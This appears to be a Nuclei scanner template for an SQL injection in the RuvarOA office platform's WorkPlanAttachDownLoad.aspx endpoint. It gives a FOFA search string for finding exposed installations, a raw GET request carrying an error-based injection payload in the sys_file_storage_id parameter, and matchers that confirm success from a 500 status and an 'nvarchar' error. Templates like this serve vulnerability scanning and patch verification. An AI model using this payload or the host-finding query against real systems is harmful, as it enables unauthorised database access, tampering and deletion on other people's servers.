id: ruvaroa-workplanattachdownload-sqli

info:
  name: "RuvarOA协同办公平台 WorkPlanAttachDownLoad接口存在SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="txt_admin_key"
          RuvarOA协同办公平台在WorkPlanAttachDownLoad接口处理过程中存在SQL注入缺陷，攻击者可通过此漏洞执行未经授权的数据库操作，包括数据篡改、删除或插入，进而导致数据完整性受损或服务中断。
  tags: RuvarOA协同办公平台

http:
- raw:
  - |
    GET /WorkPlan/WorkPlanAttachDownLoad.aspx?sys_file_storage_id=1%27%20and%20%28@@version%29%3E0%29-- HTTP/1.1
    Host: {{Hostname}}
    Connection: close
  matchers-condition: and
  matchers:
  - type: status
    status: [500]
  - type: word
    part: body
    words:
    - 'nvarchar'
